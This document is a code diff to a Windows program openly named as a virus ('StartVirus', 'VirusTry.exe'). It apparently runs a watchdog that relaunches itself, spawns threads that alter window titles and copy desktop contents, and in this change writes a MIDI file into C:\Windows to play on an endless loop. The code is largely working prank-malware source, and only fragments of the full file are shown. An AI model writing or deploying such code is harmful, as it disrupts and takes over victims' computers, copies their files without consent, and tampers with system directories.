@@ -25,11 +25,11 @@ WCHAR g_szStartupPath[100];
 // Setting
 void Init();
 BOOL CopySelf();
-BOOL IsInStartupPath();
+BOOL IsInPath();
 
 // Startup
 void StartVirus();
-void ExecuteFromStartup(LPCWSTR arg);
+void ExecuteFromSys(LPCWSTR arg);
 
 // Threads
 void* Thread_title_change(void* args);
@@ -50,11 +50,12 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
 
     args = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-    if ((argc > 1) && (IsInStartupPath() == TRUE))
+    if ((argc > 1) && (IsInPath() == TRUE))
     {
         if (lstrcmpW(args[1], L"/main") == 0)
         {
             pthread_t pht[4];
+            pthread_create(&pht[0], NULL, Thread_play_music, NULL);
             Sleep(20000);
             for (int i = 0; i < 5; i++)
             {
@@ -65,7 +66,7 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
                     pthread_create(&pht[1], NULL, Thread_title_change, NULL);
                     pthread_create(&pht[2], NULL, Thread_copy_somepart, NULL);
                 }
-                ExecuteFromStartup(L"/watchdog");
+                ExecuteFromSys(L"/watchdog");
                 Sleep(20000);
             }
             pthread_create(&pht[3], NULL, Thread_copy_alldesktop, NULL);
@@ -73,7 +74,7 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
         }
         if (lstrcmpW(args[1], L"/watchdog") != 0)
         {
-            ExecuteFromStartup(NULL);
+            ExecuteFromSys(NULL);
             return 0;
         }
         LocalFree(args);
@@ -89,7 +90,7 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
             return 0;
         }
         Sleep(1000);
-        ExecuteFromStartup(L"/main");
+        ExecuteFromSys(L"/main");
         MessageBoxA(NULL, "Okay! \nNow we finish the task, you can press Yes(Y) to quit. ", "Quit", MB_OK);
         exit(0);
     }
@@ -282,21 +283,28 @@ void* Thread_copy_somepart(void* args)
 
 void* Thread_play_music(void* args)
 {
-    LPCSTR sound;
+    HANDLE hFile = CreateFile("C:\\Windows\\wincat.mid", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
+    HRSRC hRes = FindResource(NULL, "MID_CAT", "WAVE");
+    HGLOBAL hMem = LoadResource(NULL, hRes);
+    DWORD dwSize = SizeofResource(NULL, hRes);
+
+    DWORD dwWrite = 0;
+    WriteFile(hFile, hMem, dwSize, &dwWrite, NULL);
+    CloseHandle(hFile);
+
+    MCI_OPEN_PARMS mciOpen;
+    UINT wDeviceID;
+    mciOpen.lpstrDeviceType = "sequencer";
+    mciOpen.lpstrElementName = "C:\\Windows\\wincat.mid";
+
+    mciSendCommand(0, MCI_OPEN, MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen);
+    wDeviceID = mciOpen.wDeviceID;
+    MCI_PLAY_PARMS mciPlay;
+
     while (1) {
-        switch (rand() % 3)
-        {
-        case 0:
-            sound = "WAVE_CAT";
-            break;
-        case 1:
-            sound = "WARE_ROPE";
-            break;
-        case 2:
-            sound = "WARE_NOS";
-        }
-        PlaySoundA(sound, NULL, SND_RESOURCE|SND_SYNC);
-        Sleep(10000);
+        mciSendCommand(wDeviceID, MCI_SEEK, MCI_SEEK_TO_START, NULL);
+        mciSendCommand(wDeviceID, MCI_PLAY, MCI_WAIT, (DWORD_PTR)&mciPlay);
+        Sleep(5000);
     }
 }
 
@@ -315,16 +323,15 @@ void StartVirus()
     pthread_exit(NULL);
 }
 
-void ExecuteFromStartup(LPCWSTR arg)
+void ExecuteFromSys(LPCWSTR arg)
 {
     WCHAR szStartup[100];
     lstrcpyW(szStartup, g_szStartupPath);
     lstrcatW(szStartup, L"\\VirusTry.exe");
-
     ShellExecuteW(NULL, NULL, szStartup, arg, NULL, SW_SHOW);
 }
 
-BOOL IsInStartupPath()
+BOOL IsInPath()
 {
     WCHAR szStartup[100];
     lstrcpyW(szStartup, g_szStartupPath);
